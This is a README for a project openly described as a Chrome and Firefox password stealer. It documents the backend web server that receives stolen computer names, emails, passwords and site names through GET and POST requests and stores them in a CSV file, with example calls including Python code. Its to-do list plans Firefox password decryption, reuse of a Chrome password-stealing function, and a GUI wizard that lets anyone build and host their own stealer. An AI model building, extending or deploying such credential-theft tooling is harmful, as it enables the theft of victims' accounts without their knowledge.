# Password Stealer (Chrome+Firefox)

# Web Server

### What is this -
- This is an easily hostable web server that is possible to store the given data to a `.csv` file.

###  What is the main purpose - 
- This is intended to be used as password stealing web server(backend, the storing part)

## GET
- Example -
```
http://localhost:8090/password?pcname=TEST-MACHINE&email=test@gmail.com&password=helloworld123&website=facebook
```

### Parameters -
- `pcname`
    - the name of the computer, this could be the username or the hardware id
- `email`
    - the email address or username or phone number to login
- `password`
    - the password used to login
- `website`
    - the website where the `email` and the `password` can be used to login


## POST
- Send a post request with the required data to the webserver
- Example(Python) -
```python
import requests
data = {
    "pacname": "TEST-MACHINE",
    "email": "test@gmail.com",
    "password": "helloworld123",
    "website": "facebook"
    }
requests.post("http://localhost:8090/password", data=data)
```

### Data -
- `pcname`
    - the name of the computer, this could be the username or the hardware id
- `email`
    - the email address or username or phone number to login
- `password`
    - the password used to login
- `website`
    - the website where the `email` and the `password` can be used to login

<br>
<br>

---
# To-Do
0. setup FireFox Password Steal with [this script](https://github.com/unode/firefox_decrypt) (make use of this code to do it)
1. Reuse and modify the chrome password stealing function to be used with this
2. Create a MAKER/WIZARD to make our own stealer by entering the link where we host it
3. Make a GUI for the WIZARD making it easy for anyone to create thier own stealer + host it(tk)
4. Make a dashboard for the end user to start the flask server and do other stuff
4. make `index,html` at `/` better 
